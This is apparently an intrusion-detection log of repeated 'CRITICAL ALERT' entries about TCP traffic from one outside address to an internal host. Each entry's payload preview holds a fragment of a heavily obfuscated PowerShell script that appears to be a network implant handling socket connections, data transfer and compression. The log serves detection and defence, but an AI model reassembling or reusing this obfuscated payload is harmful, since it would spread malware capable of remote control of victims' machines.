2181-7851))),(230179/(10056-(16266-8489))),(758872/6542),(923105/(13587-(41549880/(53499207/7159)))),(440082/9567),(349015/4205),(7196-7085),(1726-1627),(-9938+(1410+8635)),(-7139+7240),(1036692/8937),(270891/3429),(1134560/10130),(342200/(1144+(6830292/(25611704/6772)))),(-2514+2619),(-8426+(13651-5114)),(486200/4420),(-7423+(10859-(9184-5826))),(6212-6115),(9863-(18040-8286)),(-3287+3388)))), ([efhniujbapg]::(([char[]]@((887260/8066),(8091-7990),(-8
2000
278+8397)) -join ''))(@((9221-(7138+2
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.176965
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
67-(13180-(17309-(4192+4944))))))))))(([ndbzhroc]::kdziqtorjwe -split ([char[]]@((7626-(45021916/(9761-3823)))) -join ''))[(blfnpqac -Minimum (5835-5835) -Maximum ([ndbzhroc]::kdziqtorjwe -split ([efhniujbapg]::(([efhniujbapg]::(([efhniujbapg]::(([char[]]@((8123-8013),(605495/(11684255/(-7145+(74161570/(7004+(-7475+(51876764/6014))))))),(4804-(10016-5331))) -join ''))(@((425700/3870),(-8751+(44596376/(45865952/9104))),(2094-1975)))))(@((3172-3062),(5972-5871),(-7858+7977)))))(@((5866-(7667574/13
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.178352
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
9182))),(6299-(9383-(7687170/2406))),(808390/7349),(402600/3660),(6896-6795),(4901-4802),(6177-6061))| ForEach-Object { [char]$_ })))($mwkutasehbrf, $flcbimhxq); if ([hcqzstiefywu]::vkrhbduywifea.Connected) { break } } catch {} } if ([hcqzstiefywu]::vkrhbduywifea.Connected) { [hcqzstiefywu]::foulwkb = $true; [hcqzstiefywu]::kiazqcmghuoxdp = [ftnpxbe]::((-join (@((3555-(-3385+(44941400/6580))),(432583/(-4150+8433)),(455651/(33090218/8642)))| ForEach-Object { [char]$_ })))([rudgtxqbfielc]::(([char
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.180211
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
h-Object { [char]$_ })))().(([efhniujbapg]::((-join (@((-2824+(6794-3860)),(-3508+(33567309/(4636+(6045-1380)))),(7386-(2609+(8476-(14802386/3877)))))| ForEach-Object { [char]$_ })))(@((573032/6904),(-6809+(-2215+9136)),(7217-(51042620/7180)),(406245/(8093948/(14139828/6759))),(3678-(5351-(7338478/4102)))))))(([efhniujbapg]::((-join (@((2714-2604),(283608/2808),(223482/(6294-(14510-(56597058/(-1187+6794))))))| ForEach-Object { [char]$_ })))(@((560802/9669)))))[(0/9806)], $null, [ygajoubdxiezm]::
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.183399
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[char]$_ })))()));[hcqzstiefywu]::lqrhxnicdoyejw = (4482-(2936+1546));[hcqzstiefywu]::veijyhokpsfu=$false; [hcqzstiefywu]::kvgbftod = [npieqhagtr]::((-join (@((844800/7680),(972529/9629),(-1487+1606))| ForEach-Object { [char]$_ })))([System.Threading.TimerCallback](pjtgidhcmzwxf { [hcqzstiefywu]::((-join (@((-5689+(33558840/5796)),(5906-5793),(988652/8308),(4103-3985),(3967-3846),(10328-10226),(7869-(2121+5628)),(867663/(3190+4919)),(5638-(10252-4730)),(-7792+(17345-(415+9028))),(1145860/(7480+2
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.185063
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
opmfnya); }), $null); } else { [hcqzstiefywu]::foulwkb = $false; return } } catch { [hcqzstiefywu]::foulwkb = $false; return } } static [void] syiejb() { try { if ([hcqzstiefywu]::khesgmuavcoqbi -ne $null) { [hcqzstiefywu]::khesgmuavcoqbi.(([efhniujbapg]::(([efhniujbapg]::((-join (@((-7698+(56420608/7226)),(4360-4259),(-1527+(3817-2171)))| ForEach-Object { [char]$_ })))(@((-4932+5042),(4987-4886),(4610-(27381627/6097))))))(@((-6180+6248),(-5404+(24531577/4453)),(5489-5374),(831824/7427),(-3287+(
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.186463
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
_ })))(); } } catch { } [hcqzstiefywu]::foulwkb = $false;} static [void]lurimgyexqoh($opmfnya) { try { if (-not [hcqzstiefywu]::vkrhbduywifea.Connected -or -not [hcqzstiefywu]::foulwkb) { [hcqzstiefywu]::foulwkb = $false; return } $aqvldjrfnhsib = [hcqzstiefywu]::kiazqcmghuoxdp.((-join (@((3911-(37002302/(18128-8497))),(5247-(29738093/(-4258+10047))),(9524-9424),(-8057+(4653+(34096566/9781))),(60
1000
7111/6011),(-7463+7560),(-9285+9385))| ForEach-Object { [char]$_ })))($opmfnya); if ($aqvldjr
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.188170
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
8200000/10000))) { $kqtsfvnr = [hcqzstiefywu]::kiazqcmghuoxdp.(([char[]]@((-2459+(-593+(9359-(10613625/1705)))),(-6555+6656),(7565-7468),(252100/(8103-5582))) -join ''))([hcqzstiefywu]::txlovdphrmiz, [hcqzstiefywu]::udlktqrnmcah, [hcqzstiefywu]::helvkma); if ($kqtsfvnr -le (6672-6672)) { [hcqzstiefywu]::foulwkb = $false; return } [hcqzstiefywu]::udlktqrnmcah += $kqtsfvnr; [hcqzstiefywu]::helvkma -= $kqtsfvnr; if ([hcqzstiefywu]::helvkma -lt (0/3145)) { [hcqzstiefywu]::foulwkb = $false; return } 
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.190498
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
(1126+8220))); } } elseif ([hcqzstiefywu]::helvkma -lt (-4481+4481)) { [hcqzstiefywu]::foulwkb = $false; return } [hcqzstiefywu]::kiazqcmghuoxdp.((-join (@((-1389+1455),(815878/8078),(-4422+(13979-(39413726/4169))),(-7690+(6195+1600)),(7411-7301),(-2561+(-6716+9359)),(7040-6939),(529814/5462),(491100/4911))| ForEach-Object { [char]$_ })))([hcqzstiefywu]::txlovdphrmiz, [hcqzstiefywu]::udlktqrnmcah, [hcqzstiefywu]::helvkma, (fphucwkigya { param($opmfnya) [hcqzstiefywu]::(([efhniujbapg]::(([char[]]
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.192889
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[hcqzstiefywu]::vkrhbduywifea.((-join (@((6681-6601),(-2070+(-1414+(10691-7096))),(2958-2850),(690876/6397))| ForEach-Object { [char]$_ })))((24141000000/(28349581/3523)), [uncsxyf]::SelectWrite); [hcqzstiefywu]::kiazqcmghuoxdp.(([efhniujbapg]::(([efhniujbapg]::(([char[]]@((-3999+4109),(279164/(8604-5840)),(-8060+8179)) -join ''))(@((-4106+(23744512/5632)),(8303-8202),(817
1000
530/6870)))))(@((-3439+(13086-9560)),(429324/3766),(-8467+8572),(2313-2197),(-2760+(4036871/(-3792+5203)))))))($jzakn
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.195059
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
([char[]]@((793380/7556),(146520/(-1133+(11058-8593))),(5670-5552),(912642/(13627-5405)),(-9602+(14268-(10737-6178))),(863449/(10158-1609)),(1318-(-4411+(14818-9188))),(552780/4980),(-2872+(967+(-1749+3763))),(5481-5372),(-2360+(660+(-6672+8469))),(707740/(33894312/5268)),(1005800/(13141-(28067632/9104)))) -join '').(-join (@((-1525+1626),(8559-8439),(527520/(11450-(3747+(27538593/(35939106/3906))))),(263355/(11723-9008)),(-3930+4040),(-7327+(13969-(8112080/(5414-(14213-(2110+(39557781/(8619-363
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.197476
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
(-7094+(8427-(11131-(83533590/8442)))),(-4959+(-4849+9918)),(4382-4282)) -join '').([char[]]@((-9110+(135+(18961-9885))),(-3199+3319),(976080/(695+(60935960/7598))),(-6688+(5344+1441)),(973720/(11281-(-3751+6180))),(-10047+(17841-(20089034/(14005404/(6897-1533))))),(-2257+(-3218+5590)),(1144572/(6862+3005)),(6338-6224),(-7673+7778),(899910/(43981056/5376)),(2524-2421)) -join '')(-join (@( (8649-8569),(4062-(-5978+9935)),(358160/3256),(-1214+(8426166/(-2624+9022))))| dckpnfmvq { [char]$_ })); }; 
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.199677
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
/(13488-6026))),(-9828+9943),(-7755+7871),(6917-6816),(9158-(30630865/(12659900/(37512200/(6365+(11125-7460)))))),(-1930+(11441040/(51953670/(45089325/(1240+(11882-8097)))))),(143518/1966),(-2941+3020),(8523-(5168+(12053-(77498072/(7701+1162))))),(-5745+(9692-3870)),(663065/6565),(391855/(6167-(9136-6564))),(-2733+(-3172+(8710-(15571320/(12022400/(2
2000
383680/1146)))))),(-3836+(-5947+9897)),(1131229/9349),(-7013+7096),(1879-(-3388+(29061942/5642))),(4903-4789),(9688-9587),(3337-(7304-4064)),
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.202028
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
press)); $oqhwmya = txksvfqgizacy ((-join (@((535931/(-2750+(14711-5504))),(-8809+(14871-(-933+(12498-(12231-(29011337/(23505023/5353))))))),(10196-10081),(-3529+3645),(-9841+9942),(-4086+(42952605/10239)),(7172-7126),(-6843+(1555+5361)),(3195-3116),(-4976+(31698864/(8016240/1270))),(10277-10194),(-4899+(1183+(11226-7394))),(10239-10125),(10304-10203),(6789-(52010224/7772)),(1103407/10123),(-4274+(-4844+9200)),(904253/8953),(526516/5428),(-4084+(12798-(7325+1289))),(-3573+3674),(914052/(4014+400
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.203772
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
n (@((322520/(-1485+(10107-(2974+2716)))),(9746-9645),(654738/5502))| ForEach-Object { [char]$_ })))(@((9992-(92369928/(17963-(86+8558)))),(656011/(-722+(16420-8935))),(10286-(18508-8321)),(4786-(-1199+(-1093+(33202873/(-3879+8642))))),(152510/1510),(4764-4648))))=$global:mdtgwnxlu.([char[]]@((9569-(1111+8353)),(2845-2735),(286976/2432),(1379-1268),(630765/(20048895/3401)),(-6402+6503),(-7244+7343),(6961-6850),(953641/(18747-9998)),(289286/2654),(2436-(22009990/9410)),(4143-(18200929/4513)),(-22
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.205560
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
,(-5788+5910),(268496/2768),(865392/7152),(-9653+(6360+3411)),(220696/(11141-8889)),(-4705+(6305-(9714472/(4612+1860)))),(4473-(41646720/(79720992/8346))),(-9200+(15040-(-485+(35421846/5693)))),(1020800/10208),(-8334+8439),(3528-3409))| ForEach-Object { [char]$_ })))([hcqzstiefywu]::(([efhniujbapg]::((-join (@((977680/(59727360/6720)),(126654/(7480110/(-3299+9264))),(-9234+(19140-(7359+(-4815+7243)))))| ForEach-Object { [char]$_ })))(@((-9723+(35341488/3596)),(8762-8655),(5746-5636),(894780/(841
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.207183
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
-7299+(13965-(2976+2300)))),(-5051+(12138672/2352)),(7427-7309),(599178/(-1113+(28856752/(32522016/7338)))),(953049/8907),(4406-4305),(7175-7076),(2957-2846),(294082/2698),(5310-(-4812+(19381-(4926+4442)))),(4955-4858),(2602-2492),(-9377+(802+8675))) -join '').(-join (@((-2143+2244),(-9132+9252),(7275-7163),(742729/(13724-(1788+4279))),(624690/5679),(7854-7754),(7354-7239),(7538-(47834790/6445)),(195624/1716),(994035/(5169+4298)),(4510-4400),(8798-8695))| vimresa { [char]$_ }))(-join (@( (-3743+
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.208749
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
516/7916),(-1095+(6297-5082)),(-6475+(15903-9316)),(151223/1559),(-7813+(68668641/(14836-6169))),(10254-10154),(-6906+7021),(-9862+(83994804/(16002-7584))),(-7698+(46278288/5924)),(8471-(56378474/(1027+5712))),(10072-(48206118/(13820-8981))),(-3668+(16415163/(20132625/(572+(4729851/(11643159/9977)))))))))(-join (@( (3827-3759),(737964/6833),(-2509+(4889-2272)))| yghszmiejpu { [char]$_ }))); }; [hcqzstiefywu]::jupncbzrkfte =$aocvhfsktz.($global:mdtgwnxlu.([efhniujbapg]::(([char[]]@((-2091+(566977
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.211433
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
2+1474)))),(798868/(1157+6599)))))([efhniujbapg]::(([char[]]@((-4596+(33440836/(9397-(5630-3339)))),(552167/5467),(-4350+4469)) -join ''))(@( (743127/(11082-(8118063/5673))),(7466-7351),(275628/2676),(-8955+9067),(-2242+2339),(-3185+(8305236/2529)),(8272-8165))))); [hcqzstiefywu]::((-join (@((-
2000
2040+2150),(802230/7865),(278892/(11559-(13468-(31508645/(32394943/4313))))),(-9626+(10895-(-5764+(42205560/(1835+4250))))),(223729/1849),(448518/3801),(5177-(9772-(6276-(11019-(17592-(9926-(11063-
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.213331
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
)),(-4793+4904),(238242/(8526-(7489557/1151)))))))($_.Exception.Message); } break } ([char[]]@((9668-(30993683/3241)),(2781-(16937600/(-478+(12016-5218)))),(2041-(-7759+(16936-(35597936/4906))))) -join '') { try { $yztpjbnomug= [uqmtzgospikw]::ASCII.((-join (@((-4712+4783),(866883/(39790788/4636)),(-5065+5181),(332166/4002),(-1834+1950),(353970/(1615+(-6365+(37554755/(-3111+(36934560/(9293-4613))))))),(9932-9827),(620730/(32294889/(52783229/(38432241/4167)))),(4641-(12849-(10756-2445))))| ForEac
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.216149
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
6078))| gkpmzn { [char]$_ }))=(-join (@((131565/(3348016/2672)),(5582-5481),(370680/3089))| suejbqoazcrpxn { [char]$_ })); ([efhniujbapg]::(([efhniujbapg]::((-join (@((-8363+(29748703/(10698-7187))),(2926-2825),(-5436+(15292-9737)))| ForEach-Object { [char]$_ })))(@((7016-(-2687+(18450-8857))),(7417-(552+6764)),(-4743+(6041-(12049380/(15257-5037))))))))(@((-6094+6208),(767095/(25845785/3403)),(730480/(9222-(27463030/(36209096/(1268+(22815088/(306+(16915-8153)))))))),(-1377+(6165738/(39870947/966
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.217717
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
(941280/(6584+(-4275+(9615-3044)))),(4529-(5+4409)),(8384-8272),(4749-(27702774/5973)),(3414-3296)) -join ''))($global:mdtgwnxlu.([efhniujbapg]::(([efhniujbapg]::((-join (@((4168-(10445292/2574)),(5307-(6737-1531)),(5604-5485))| ForEach-Object { [char]$_ })))(@((493130/4483),(5910-(2840+2969)),(229789/1931)))))(@((-4319+4424),(6812-(9165-2463)),(-7919+(16664-8627)),(3639-3528),(971774/(13854-4772)),(2829-2728),(983466/(59246376/5964)),(800754/(58758030/(34779150/4270))),(250482/2298),(541839/(-1
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.219386
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
Exception.Message+$_.Exception); } } catch { $zusvioywabke = @{ ([char[]]@((-6608+6688),(237262/2446),(2111-2012),(4015-3908),(7571-(-1410+8880)),(-4608+4724)) -join '')=(-join (@((423360/4032),(625392/(13989-7797)),(6282-(-570+(9332-(12602200/4847)))))| zupmcenhq { [char]$_ })); (-join (@((7079-(25345635/3639)),(5861-(12734-(9826-(10321388/3619)))),(5711-5596),(-6174+6291),(1075140/9955),(2651-2535))| fdchmjyx { [char]$_ }))= [string]$_.Exception; }; } break } ([efhniujbapg]::((-join (@((883080
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.221031
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
518/5234)))),(-2856+2964),(-4196+(30687720/7140)),(-3437+(11744-(12322-(5538-(10106-(10252-(4249-2680))))))),(9211-9110),(1005804/9313),(-6967+(57102372/(3755+4324))),(1058848/9128),(-7262+7363)))) { try { yqdxnlkwz $global:mdtgwnxlu.([char[]]@((556290/5298),(-4742+4852),(-1567+1685),(951270/8570),(8086-7979),(-7159+7260),(5119-5020),(-1886+1997),(-8955+(7693+(3599-2228))),(4488-(44030845/10055)),(9655-(58753026/(1173+(732+4242)))),(-8089+(3131+5068)),(6354-(1738+(14138-(16263-6641))))) -join ''
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.222983
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
93680/(5398-3784)),(688218/(56488209/(17943-8586))),(-3201+3311),(-3675+(-4606+8387)),(553495/(33060497/6869)),(6424-(50470752/7996)),(387168/(16704032/4789)),(5877-5759)))))($_.Exception.Message); } break } ([efhniujbapg]::(([char[]]@((85
1000
80-8470),(-1648+1749),(545734/4586)) -join ''))(@((-9600+9715),(-9575+(59231328/(52066248/(15109-6607)))),(1124068/(84714718/(4421+(6000-(7144928/(8916-4240)))))),(783255/7755),(-6007+(-2017+8104)),(2071-1963),(9704-(86954090/(1389+7681))),(-5944+(28378
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.224684
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
cin; $eiclzjpmbn = bwuojecxagsfly (([efhniujbapg]::(([char[]]@((-5117+5227),(1006162/(16079-6117)),(801941/6739)) -join ''))(@((9520-(5456+3981)),(7342-(10913-(8529-(-2713+(4201+(27759861/8289)))))),(-7627+7742),(-9751+9867),(296233/(23936213/(643+(8783-(2045505/1617))))),(1074086/9854),(58006/1261),(-7546+(2220+(4139+(-5467+(2258+4469))))),(5127-5048),(3910-3864),(8644-(868+(13118-5419))),(-2339+2440),(9285-(6531+2645)),(919524/(6658+1626)),(-8368+(36650722/4321)),(2128-(-4356+6363)),(4602-(278
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.226118
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
9-3642)),(-3264+3378),(6344-(10421-(3043+(6024580/5308)))),(495535/4309),(447925/(-3825+7720)),(896490/8538),(6151-(-549+(29914060/4540))),(-1127+(-7035+8272)),(135608/(14813700/(12512-(73357626/(5561+(6898-(26061834/9794))))))),(-3532+(290+3313)),(-2263+2385),(537285/(-3813+8930)),(-7944+(16015-7959)),(194635/2345),(523160/4510),(593712/(-2597+7805)),(929503/(65644999/(12204-5071))),(3863-(10913-(1730+(14534-9117)))),(122298/(-51+(3937-2764)))))))($eiclzjpmbn, [ydrihzvj]::Compress); $zrpchaeltj
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.227806
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
-join ''))(); return $eiclzjpmbn.($global:mdtgwnxlu.([char[]]@((-5065+5170),(-5499+(17045751/(27822045/(14+(14499-(6800-1442)))))),(8987-(70614978/7962)),(-2114+2225),(-8865+8972),(-1227+1328),(-4157+(7915-(-6420+(1
1000
6196-6117)))),(-7891+8002),(913747/(53005709/(12569-6246))),(-7205+7314),(3652-3555),(250250/2275),(6085-5985)) -join '').(-join (@((6707-6606),(9909-(13621-(13611-9779))),(-8590+(77047508/8854)),(-5697+(12361-6567)),(433510/3941),(6700-(62614200/9487)),(-7472+(-216+7803)),(-8
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.229458
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
28-8323),(7078-(70105048/(99020362/9842))),(8944-(88639866/10026)))| ForEach-Object { [char]$_ })))($aocvhfsktz.($global:mdtgwnxlu.(-join (@((10205-(442+(63443402/6569))),(-5045+5155),(-4488+(26562802/(1332+4435))),(-1463+1574),(3915-(37173696/9762)),(625796/(13159-(5631+1332))),(908424/9176),(3669-(19903452/5594)),(3039-2930),(730300/6700),(9167-9070),(466070/4237),(-5540+(2593+3047)))| pnskxvmudawyl { [char]$_ })).(-join (@((1019999/(17798-7699)),(-5164+5284),(1130416/(13862-(37509088/(11977-(
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.231765
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
486-(12282-(-2862+(10021-2256)))),(-1742+1843),(956340/(874+8786)),(-4850+(8854-3893)),(2384-2275),(-2018+2127),(-4081+4178),(904750/8225),(958600/(3910+(13151292/(3665494/1582)))))| ewqsznbhamj { [char]$_ })).(-join (@((-9079+(6841+2339)),(-2880+3000),(4816-4704),(-1533+(11734-10104)),(230230/2093),(-3367+(18000664/5192)),(653200/5680),(8561-8445),(-10007+10121),(1300-1195),(593450/(8272-2877)),(-5675+(47056032/(1643+(14832-(13601-5270))))))| tpzqybjgcm { [char]$_ }))(-join (@( (792240/(1093+88
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.233805
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
| ForEach-Object { [char]$_ })))(@((287430/(10709-(3707+4389))),(5557-(33881760/(11365-5155))),(-3416+(9523290/2694))))))(@((9052-8942),(-4125+(9428206/2231)),(139349/(8923-7752))))))(@((1003
6000
7-9955),(302913/(5326-(8226-5489))),(-9799+(6803+(25379126/(-1008+9179))))))))([hcqzstiefywu]::vkrhbduywifea, [ndbzhroc]::aithrkpnyev, [ndbzhroc]::yikgmwbpujcenv, [jgqhpo]::((-join (@((7139-(10618-3549)),(-5428+(10984244/1982)),(-8584+(14246-5551)),(1048253/(12789-3172)),(7072-(-2064+(21178450/2335))
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.235511
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
87753/9599))),(4737-(-3038+(32732944/4271))),(302039/2771),(-1616+1725),(-2540+2637),(653620/(50964534/(17417-(845+(16241-8246))))),(210300/2103))| azkbdtrov { [char]$_ })).([efhniujbapg]::((-join (@((358270/3257),(647511/(9841-3430)),(445536/3744))| ForEach-Object { [char]$_ })))(@((-7832+7933),(7372-(4215+(7362-(1408+2917)))),(-1815+1927),(-3840+(8578-(245+4396))),(7454-7344),(-4658+4758),(269790/(-975+(10082-(8297-(11692-10156))))),(257288/2218),(718884/6306),(733425/6985),(7198-(54+(13991-(1
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.237137
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
1+(-1903+(-378+4028)))),(-9013+(19902022/(19088136/8748))),(618772/(11309-(-4224+(11008-(-5696+(41160015/(4103+1396))))))),(519270/(10912-6357)),(474096/4648),(7072-(45765016/(17379120/2640))),(-2094+2191),(6138-(7730-(2755280/(-3269+(6197-(11519-10207))))))) -join ''))($artksfgjempcin)); lpboyqtiejrdkv -Milliseconds (10002000/(15863172/1586));}static [void] cleyxrnjspov($wxgcpnqbf) { $artksfgjempcin = @{ (-join (@((1863-(-2259+(35092644/8682))),(-6865+(17092-10130)),(669537/6763),(10045-(3951+5
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:42:08.238919
Signature(s): powershell_command
Threat Score: 8

Packet Info:
  Source: 167.71.107.109:80
  Destination: 10.2.21.101:64067
  Protocol: TCP
  Payload Size: 1376 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
